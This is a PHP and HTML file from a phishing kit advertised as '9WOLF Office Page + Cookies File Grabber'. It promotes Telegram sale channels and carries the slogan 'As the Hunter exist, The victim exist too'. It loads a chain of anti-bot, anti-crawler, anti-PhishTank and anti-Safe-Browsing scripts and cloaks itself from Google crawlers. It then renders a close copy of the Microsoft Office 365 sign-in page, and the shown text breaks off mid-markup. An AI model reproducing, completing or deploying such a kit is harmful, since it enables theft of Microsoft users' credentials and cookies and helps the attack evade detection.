<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(E_ALL ^ E_NOTICE);
ob_start();
session_start();
$path = "../site/";
require ("../9WOLFConfi/Guration.php");
require ("../9WOLFConfi/Function.php");
require ("../9WOLFDecline/AntiBotIp.php");
require ("../9WOLFDecline/AntiBotPw.php");
require ("../9WOLFDecline/AntiBotKillBot.php");
require ("../9WOLFDecline/AntiBotUserAgent.php");
require ("../9WOLFDecline/AntiBotIsp.php");
require ("../9WOLFDecline/AnitiBotHost.php");
require ("../9WOLFDecline/AntiBotPhishTank.php");
require ("../9WOLFDecline/AntiBotVpn.php");
require ("../9WOLFDecline/AntiBotProxy.php");
require ("../9WOLFDecline/AntBotProtection.php");
require ("../9WOLFDecline/SaveBrowsing.php");
require ("../9WOLFDecline/DiscoveredBot.php");
require ("../9WOLFDecline/AntiBotThree.php");
require ("../9WOLFDecline/DisturbOne.php");
require ("../9WOLFDecline/DisturbTwo.php");
require("../9WOLFDecline/Anti/Bot-Crawler.php");
@require("../9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
$rand = generateRandomString(130);
$cage = substr(sha1(mt_rand()),1,25);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();
}

#if (isset($_POST['hidden']) && !empty($_POST['9WOLFDatorKiller'])  ) {
 # include($path."index.php"); exit();
#}
#if (!isset($_SESSION['9WOLF_SESSION_T0k3n'])  ) {
##  include($path."index.php"); exit();
#}



?>

<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex,nofollow" />
    <meta name="googlebot" content="noindex,nofollow" />
    <meta name="googlebot-news" content="nosnippet">
    <META NAME="robots" CONTENT="nofollow">
    <meta http-equiv="Cache-Control" content="no-store">
    <meta http-equiv="Cache-Control" content="no-cache">
    <meta http-equiv="Cache-Control" content="private">
    <meta http-equiv="Pragma" content="no-cache">
    <title><?php echo htmlentities("Working", ENT_QUOTES, "UTF-8"); ?></title>
    <link rel="shortcut icon" href="./assets/mic.ico">

    
    
<meta http-equiv="x-dns-prefetch-control" content="on">


        <meta name="format-detection" content="telephone=no">

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>
<style>
    /*! CSS Used from: https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css */
html {
  font-family: sans-serif;
  -ms-text-size-adjust: 100%;
  -webkit-text-size-adjust: 100%;
}
body {
  margin: 0;
}
a {
  background-color: transparent;
}
a:active,
a:hover {
  outline: 0;
}
img {
  border: 0;
}
input {
  color: inherit;
  font: inherit;
  margin: 0;
}
html input[type="button"],
input[type="submit"] {
  -webkit-appearance: button;
  cursor: pointer;
}
input {
  line-height: normal;
}
input[type="checkbox"] {
  box-sizing: border-box;
  padding: 0;
}
* {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}
*:before,
*:after {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}
input {
  font-family: inherit;
  font-size: inherit;
  line-height: inherit;
}
a:focus {
  outline: thin dotted;
  outline-offset: -2px;
  outline: 5px auto -webkit-focus-ring-color;
}
img {
  vertical-align: middle;
}
html {
  font-size: 100%;
}
body {
  font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue",
    "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi",
    "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga",
    "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee",
    "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
    "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue",
    "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
    "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
  font-size: 15px;
  line-height: 20px;
  font-weight: 400;
  font-size: 0.9375rem;
  line-height: 1.25rem;
  padding-bottom: 0.227px;
  padding-top: 0.227px;
  color: #000;
  background-color: #fff;
}
a {
  color: #ccc;
  text-decoration: none;
}
a:link {
  color: #0067b8;
}
a:visited {
  color: #0067b8;
}
a:hover {
  color: #666;
}
a:focus {
  color: #0067b8;
}
a:active {
  color: #999;
}
.text-title,
.text-body {
  margin-bottom: 20px;
  margin-top: 20px;
  margin-bottom: 1.25rem;
  margin-top: 1.25rem;
}
.text-title {
  font-size: 24px;
  line-height: 28px;
  font-weight: 300;
  font-size: 1.5rem;
  line-height: 1.75rem;
  padding-bottom: 2.3632px;
  padding-top: 2.3632px;
}
.text-body {
  font-size: 15px;
  line-height: 20px;
  font-weight: 400;
  font-size: 0.9375rem;
  line-height: 1.25rem;
  padding-bottom: 0.227px;
  padding-top: 0.227px;
}
.row {
  margin-left: -2px;
  margin-right: -2px;
}
.row:before,
.row:after {
  content: " ";
  display: table;
}
.row:after {
  clear: both;
}
.col-xs-24,
.col-md-24 {
  position: relative;
  min-height: 1px;
  padding-left: 2px;
  padding-right: 2px;
}
.col-xs-24 {
  float: left;
}
.col-xs-24 {
  width: 100%;
}
@media (min-width: 768px) {
  .col-md-24 {
    float: left;
  }
  .col-md-24 {
    width: 100%;
  }
}
label {
  display: inline-block;
  max-width: 100%;
}
input[type="checkbox"]:focus {
  outline: thin dotted;
  outline-offset: -2px;
  outline: 5px auto -webkit-focus-ring-color;
}
.checkbox {
  position: relative;
  display: block;
}
.checkbox label {
  min-height: 20px;
  margin-bottom: 0;
  cursor: pointer;
}
input {
  max-width: 100%;
  line-height: inherit;
}
input[type="checkbox"] {
  width: 20px;
  height: 20px;
}
.form-group {
  margin-bottom: 12px;
}
.form-group label {
  margin-top: 0;
  margin-bottom: 8px;
}
.checkbox {
  margin-top: 12px;
  margin-bottom: 12px;
}
.checkbox label {
  padding-left: 28px;
}
.checkbox input[type="checkbox"] {
  position: absolute;
  margin-left: -28px;
}
input[type="button"],
input[type="submit"] {
  display: inline-block;
  min-width: 100px;
  padding: 4px 12px 4px 12px;
  margin-top: 4px;
  margin-bottom: 4px;
  position: relative;
  max-width: 100%;
  text-align: center;
  white-space: nowrap;
  overflow: hidden;
  vertical-align: middle;
  text-overflow: ellipsis;
  touch-action: manipulation;
  color: #000;
  border-style: solid;
  border-width: 2px;
  border-color: transparent;
  background-color: rgba(0, 0, 0, 0.2);
}
input[type="button"]:hover,
input[type="button"]:focus,
input[type="submit"]:hover,
input[type="submit"]:focus {
  border-color: rgba(0, 0, 0, 0.4);
}
input[type="button"]:hover,
input[type="submit"]:hover {
  cursor: pointer;
}
input[type="button"]:active,
input[type="submit"]:active {
  background-color: rgba(0, 0, 0, 0.4);
  border-color: transparent;
}
a:focus {
  outline-offset: 0;
}
input[type="checkbox"]:focus {
  outline-offset: 0;
}
body {
  direction: ltr;
}
.text-secondary {
  color: rgba(0, 0, 0, 0.7);
  font-size: 13px;
}
body.cb {
  text-align: center;
}
.no-margin-top {
  margin-top: 0;
}
.no-padding-left-right {
  padding-left: 0;
  padding-right: 0;
}
body.cb {
  color: #1b1b1b;
  text-align: left;
}
.background-image {
  -webkit-animation: fadeIn 1s;
  -moz-animation: fadeIn 1s;
  -o-animation: fadeIn 1s;
  animation: fadeIn 1s;
}
.background-image-holder {
  background: #f2f2f2;
}
.background-image-holder,
.background-image {
  position: fixed;
  top: 0;
  width: 100%;
  height: 100%;
}
.background-image {
  background-repeat: no-repeat, no-repeat;
  background-position: center center, center center;
  background-size: cover, cover;
}
.footer {
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  overflow: visible;
  z-index: 99;
  clear: both;
  min-height: 28px;
}
div.footerNode {
  margin: 0;
  float: right;
}
.footer-content.footer-item {
  color: #000;
  font-size: 12px;
  line-height: 28px;
  white-space: nowrap;
  display: inline-block;
  margin-left: 8px;
  margin-right: 8px;
}
.footer-content.footer-item.debug-item {
  text-decoration: none;
  letter-spacing: 3px;
  line-height: 22px;
  vertical-align: top;
  font-size: 16px;
  font-weight: 600;
}
.outer {
  display: table;
  position: absolute;
  height: 100%;
  width: 100%;
}
.middle {
  display: table-cell;
  vertical-align: middle;
}
.sign-in-box {
  margin-left: auto;
  margin-right: auto;
  position: relative;
  max-width: 440px;
  width: calc(100% - 40px);
  padding: 44px;
  margin-bottom: 28px;
  background-color: #fff;
  -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
  -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
  min-width: 320px;
  min-height: 338px;
  overflow: hidden;
}
a:hover {
  text-decoration: underline;
}
.template-section {
  display: table-row;
}
.template-section.main-section {
  height: 100%;
}
input[type="button"],
input[type="submit"] {
  min-height: 32px;
  border: none;
  background-color: #ccc;
  background-color: rgba(0, 0, 0, 0.2);
  min-width: 108px;
  line-height: normal;
}
input[type="button"]:hover,
input[type="submit"]:hover {
  background-color: #b2b2b2;
  background-color: rgba(0, 0, 0, 0.3);
}
input[type="button"]:focus,
input[type="submit"]:focus {
  background-color: #b2b2b2;
  background-color: rgba(0, 0, 0, 0.3);
  text-decoration: underline;
  outline: 2px solid #000;
}
input[type="button"]:active,
input[type="submit"]:active {
  outline: none;
  text-decoration: none;
  -ms-transform: scale(0.98);
  -webkit-transform: scale(0.98);
  transform: scale(0.98);
}
.button.secondary {
  display: inline-block;
  min-width: 100px;
  padding: 4px 12px 4px 12px;
  margin-top: 4px;
  margin-bottom: 4px;
  position: relative;
  max-width: 100%;
  text-align: center;
  white-space: nowrap;
  overflow: hidden;
  vertical-align: middle;
  text-overflow: ellipsis;
  touch-action: manipulation;
  color: #000;
  border-style: solid;
  border-width: 2px;
  border-color: transparent;
  min-height: 32px;
  border: none;
  background-color: #ccc;
  background-color: rgba(0, 0, 0, 0.2);
  min-width: 108px;
  line-height: normal;
  margin-top: 0;
  margin-bottom: 0;
  display: block;
  width: 100%;
}
.button.secondary:hover {
  background-color: #b2b2b2;
  background-color: rgba(0, 0, 0, 0.3);
}
.button.secondary:focus {
  background-color: #b2b2b2;
  background-color: rgba(0, 0, 0, 0.3);
  text-decoration: underline;
  outline: 2px solid #000;
}
.button.secondary:active {
  outline: none;
  text-decoration: none;
  -ms-transform: scale(0.98);
  -webkit-transform: scale(0.98);
  transform: scale(0.98);
}
.button.primary {
  color: #fff;
  border-color: #0067b8;
  background-color: #0067b8;
  display: block;
  width: 100%;
}
.button.primary:hover {
  background-color: #005da6;
}
.button.primary:focus {
  background-color: #005da6;
  text-decoration: underline;
  outline: 2px solid #000;
}
.button.primary:active {
  outline: none;
  text-decoration: none;
  -ms-transform: scale(0.98);
  -webkit-transform: scale(0.98);
  transform: scale(0.98);
}
.logo {
  max-width: 256px;
  height: 24px;
}
.identityBanner {
  height: 24px;
  background: #fff;
  margin-top: 16px;
  margin-bottom: -4px;
}
.identity {
  line-height: 24px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.row {
  margin-left: 0;
  margin-right: 0;
}
.text-body {
  padding: 0;
  margin-top: 16px;
  margin-bottom: 12px;
}
.form-group {
  margin-bottom: 16px;
}
.form-group label {
  margin-top: 0;
  margin-bottom: 0;
}
input[type="button"],
input[type="submit"] {
  margin-top: 0;
  margin-bottom: 0;
}
.overflow-hidden {
  overflow: hidden;
}
.position-buttons > div:first-child {
  display: inline-block;
  width: 100%;
  margin-bottom: 36px;
}
.button-container {
  position: absolute;
  bottom: 0;
  right: 0;
  text-align: right;
}
@media (max-width: 600px), (max-height: 366px) {
  .background-image-holder,
  .background-image {
    display: none;
  }
  .middle {
    vertical-align: top;
  }
  .sign-in-box {
    padding: 24px;
    margin-top: 0;
    margin-bottom: 88px;
    width: 100%;
    width: 100vw;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    border: 0;
  }
  .footer {
    background-color: #fff;
    filter: none;
  }
  div.footerNode {
    float: left;
    margin: 0 24px !important;
  }
  .footer-content.footer-item {
    color: #747474;
  }
}
.inline-block {
  display: inline-block;
}
.text-title {
  color: #1b1b1b;
  font-size: 1.5rem;
  font-weight: 600;
  padding: 0;
  margin-top: 16px;
  margin-bottom: 12px;
  font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima",
    "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI",
    "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha",
    "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
    "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue",
    "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
    "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
}
.pagination-view {
  position: relative;
  min-height: 206px;
}
.pagination-view.has-identity-banner {
  min-height: 170px;
}
.lightbox-cover {
  background-color: white;
  opacity: 0;
  filter: alpha(opacity=0);
  z-index: -1;
  height: 100%;
  width: 100%;
  position: absolute;
  top: 0;
  left: 0;
  transition: all 0.5s ease-in;
  -o-transition: all 0.5s ease-in;
  -moz-transition: all 0.5s ease-in;
  -webkit-transition: all 0.5s ease-in;
}
@media (-ms-high-contrast) {
  .button,
  input[type="button"],
  input[type="submit"] {
    -ms-high-contrast-adjust: none;
    outline: 1px solid windowText;
    border: 1px solid window;
    background-color: window;
    color: windowText;
    text-decoration: none;
  }
  .button:hover,
  input[type="button"]:hover,
  input[type="submit"]:hover {
    outline: 1px solid windowText;
    border: 1px solid highlight;
    background-color: highlight;
    color: highlightText;
    text-decoration: none;
  }
  .button:hover:focus,
  input[type="button"]:hover:focus,
  input[type="submit"]:hover:focus {
    outline: 1px solid windowText;
    border: 1px solid windowText;
    background-color: highlight;
    color: highlightText;
    text-decoration: underline;
  }
  .button:focus,
  input[type="button"]:focus,
  input[type="submit"]:focus {
    outline: 1px solid windowText;
    border: 1px solid windowText;
    background-color: window;
    color: windowText;
    text-decoration: underline;
  }
  .button.primary,
  input[type="submit"].primary,
  .button.secondary,
  input[type="button"].secondary {
    outline: 1px solid highlight;
    border: 1px solid highlight;
    background-color: highlight;
    color: highlightText;
    text-decoration: none;
  }
  .button.primary:hover,
  input[type="submit"].primary:hover,
  .button.secondary:hover,
  input[type="button"].secondary:hover {
    outline: 1px solid highlight;
    border: 1px solid window;
    background-color: window;
    color: highlight;
    text-decoration: none;
  }
  .button.primary:hover:focus,
  input[type="submit"].primary:hover:focus,
  .button.secondary:hover:focus,
  input[type="button"].secondary:hover:focus {
    outline: 1px solid windowText;
    border: 1px solid window;
    background-color: window;
    color: highlight;
    text-decoration: underline;
  }
  .button.primary:focus,
  input[type="submit"].primary:focus,
  .button.secondary:focus,
  input[type="button"].secondary:focus {
    outline: 1px solid windowText;
    border: 1px solid window;
    background-color: highlight;
    color: highlightText;
    text-decoration: underline;
  }
}
.fade-in-lightbox {
  animation: fadeIn 0.3s ease-in;
  -webkit-animation: fadeIn 0.3s ease-in;
  -moz-animation: fadeIn 0.3s ease-in;
  -ms-animation: fadeIn 0.3s ease-in;
  -o-animation: fadeIn 0.3s ease-in;
}
.animate {
  animation-duration: 0.25s;
  -webkit-animation-duration: 0.25s;
  -moz-animation-duration: 0.25s;
  -ms-animation-duration: 0.25s;
  -o-animation-duration: 0.25s;
  animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
  -webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
  -moz-animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
  -ms-animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
  -o-animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
  animation-fill-mode: both;
  -webkit-animation-fill-mode: both;
  -moz-animation-fill-mode: both;
  -ms-animation-fill-mode: both;
  -o-animation-fill-mode: both;
  transition-property: left;
  -webkit-transition-property: left;
  -moz-transition-property: left;
  -ms-transition-property: left;
  -o-transition-property: left;
}
html[dir="ltr"] .animate.slide-in-next {
  animation-name: show-from-right;
  -webkit-animation-name: show-from-right;
  -moz-animation-name: show-from-right;
  -ms-animation-name: show-from-right;
  -o-animation-name: show-from-right;
}
/*! CSS Used keyframes */
@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
@-moz-keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
@-webkit-keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
@keyframes show-from-right {
  from {
    left: 200px;
    opacity: 0;
  }
  to {
    left: 0;
    opacity: 1;
  }
}
@-webkit-keyframes show-from-right {
  from {
    left: 200px;
    opacity: 0;
  }
  to {
    left: 0;
    opacity: 1;
  }
}
@-moz-keyframes show-from-right {
  from {
    left: 200px;
    opacity: 0;
  }
  to {
    left: 0;
    opacity: 1;
  }
}
/*! CSS Used fontfaces */
@font-face {
  font-family: "Segoe UI Webfont";
  src: local("Segoe UI Light");
  font-weight: 200;
  font-style: normal;
}
@font-face {
  font-family: "Segoe UI Webfont";
  src: local("Segoe UI");
  font-weight: 400;
  font-style: normal;
}
@font-face {
  font-family: "Segoe UI Webfont";
  src: local("Segoe UI Semibold");
  font-weight: 600;
  font-style: normal;
}
@font-face {
  font-family: "Segoe UI Webfont";
  font-weight: 300;
  src: local("Segoe UI Semilight");
}
@font-face {
  font-family: "Segoe UI Webfont";
  font-weight: 700;
  src: local("Segoe UI Bold");
}
@font-face {
  font-family: "Segoe UI Webfont";
  font-style: italic;
  font-weight: 400;
  src: local("Segoe UI Italic");
}
@font-face {
  font-family: "Segoe UI Webfont";
  font-style: italic;
  font-weight: 700;
  src: local("Segoe UI Bold Italic");
}

</style>

 
 


        
         
    


    


    





    
    


<div><!--  -->

<form novalidate="novalidate" spellcheck="false" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="https://www.office.com/?auth=2">

    <!-- ko withProperties: { '$kmsiPage': $data } -->
    <div data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            handleWizardButtons: false,
            useWizardBehavior: svr.fUseWizardBehavior } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control', params: { isChinaDc: svr.fIsChinaDc, bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <div role="main" data-bind="component: { name: 'pagination-control',
                publicMethods: paginationControlMethods,
                params: {
                    enableCssAnimation: svr.fEnableCssAnimation,
                    disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                    initialViewId: 20,
                    initialSharedData: initialSharedData
                },
                event: {
                    load: paginationControlHelper.onLoad,
                    unload: paginationControlHelper.onUnload,
                    loadView: view_onLoadView,
                    showView: view_onShow,
